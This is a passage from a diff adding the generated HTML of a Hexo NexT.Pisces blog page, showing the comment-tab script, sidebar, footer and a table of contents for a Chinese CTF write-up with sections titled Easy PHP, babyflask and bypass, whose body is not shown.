+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#L3H-x-XCTF%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81wp"><span class="nav-number">1.</span> <span class="nav-text">L3H x XCTF个人能力认证wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-PHP"><span class="nav-number">1.2.</span> <span class="nav-text">Easy PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyflask"><span class="nav-number">1.3.</span> <span class="nav-text">babyflask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass"><span class="nav-number">1.4.</span> <span class="nav-text">bypass</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <!--<span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>-->
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+</body>
+</html>
